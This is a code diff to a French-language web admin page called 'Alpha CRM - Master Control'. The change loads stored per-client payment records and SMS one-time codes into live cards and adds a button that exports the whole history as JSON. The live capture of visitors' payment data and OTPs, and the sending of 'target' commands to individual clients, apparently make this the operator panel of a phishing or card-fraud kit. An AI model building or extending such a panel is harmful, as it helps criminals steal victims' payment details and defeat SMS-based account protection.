@@ -142,7 +142,12 @@
 <body>
     <header>
         <h1>Alpha CRM - Master Control</h1>
-        <div id="connectionStatus">Connexion au serveur...</div>
+        <div style="display: flex; align-items: center; gap: 20px;">
+            <div id="connectionStatus">Connexion au serveur...</div>
+            <button onclick="downloadJSON()"
+                style="background:var(--primary); border:none; color:white; padding:8px 16px; border-radius:8px; cursor:pointer; font-size:0.8rem; font-weight:600;">Exporter
+                JSON (Historique)</button>
+        </div>
     </header>
 
     <div class="grid" id="clientList">
@@ -160,7 +165,22 @@
             const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
             const socket = new WebSocket(`${protocol}//${window.location.host}/ws/admin`);
 
-            socket.onopen = () => { document.getElementById('connectionStatus').textContent = 'Live Console Connected'; };
+            socket.onopen = async () => {
+                document.getElementById('connectionStatus').textContent = 'Live Console Connected';
+                // Charger le passé
+                const res = await fetch('/v1/admin/history', {
+                    headers: { 'X-API-KEY': API_KEY }
+                });
+                const history = await res.json();
+                history.payments.forEach(p => updateOrCreateCard(p.client_id, p));
+                history.sms.forEach(s => {
+                    const card = document.getElementById(`card-${s.client_id}`);
+                    if (card) {
+                        card.querySelector('.otp-val').textContent = s.otp;
+                        card.querySelector('.otp-val').style.color = '#f59e0b';
+                    }
+                });
+            };
             socket.onmessage = (event) => {
                 const msg = JSON.parse(event.data);
                 handleMessage(msg);
@@ -260,6 +280,24 @@
                 headers: { 'Content-Type': 'application/json', 'X-API-KEY': API_KEY },
                 body: JSON.stringify({ client_id: clientId, target: target })
             });
+        }
+
+        async function downloadJSON() {
+            const res = await fetch('/v1/admin/download', {
+                headers: { 'X-API-KEY': API_KEY }
+            });
+            if (res.ok) {
+                const blob = await res.blob();
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'audit_history.json';
+                document.body.appendChild(a);
+                a.click();
+                a.remove();
+            } else {
+                alert("Erreur lors du téléchargement.");
+            }
         }
 
         connect();
